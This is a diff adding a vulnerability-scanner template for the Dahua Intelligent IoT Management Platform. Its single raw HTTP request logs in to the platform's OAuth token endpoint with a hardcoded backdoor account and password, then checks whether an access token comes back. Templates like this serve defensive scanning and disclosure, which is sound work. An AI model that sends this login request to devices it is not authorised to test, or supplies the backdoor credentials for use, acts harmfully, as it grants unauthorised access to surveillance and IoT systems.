@@ -1,0 +1,33 @@
+id: dahua-intelligent-iot-info-disclosure
+info:
+  name: Dahua Intelligent IoT Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: backdoor, iot, info-leak
+  description: |
+    Detects potential information disclosure and backdoor account vulnerabilities in Dahua Intelligent IoT Management Platform.
+
+http:
+  - raw:
+      - |
+        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+          - "access_token"
+          - "token_type"
+          - "magicId"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
